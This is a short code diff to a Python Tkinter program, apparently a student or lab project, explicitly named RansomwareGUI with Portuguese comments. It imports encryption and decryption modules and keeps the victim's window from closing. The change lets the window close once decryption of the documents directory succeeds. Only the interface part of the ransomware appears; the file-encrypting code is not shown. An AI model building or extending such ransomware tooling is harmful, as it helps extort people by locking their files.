@@ -4,6 +4,7 @@ from threading import Thread
 import encriptor
 import decryptor
 
+
 class RansomwareGUI:
     def __init__(self, master):
 
@@ -24,6 +25,11 @@ class RansomwareGUI:
     def disable_event(self):
         # Função para impedir o fecho da janela, nao faz nada
         pass
+
+    def enable_event(self):
+        # Permite fechar a janela
+        self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
+
 
     def start_encryption(self):
         # Função para iniciar a criptografia dos arquivos
@@ -46,7 +52,7 @@ class RansomwareGUI:
         try:
             decryptor.decrypt_documents_directory(key)
             messagebox.showinfo("Decryption Complete", "Decryption completed. Your files are now accessible.")
-
+            self.enable_event() #Permite que o user feche a janela
         except Exception:
             messagebox.showerror("Error", "Decryption failed! Use other key")
 
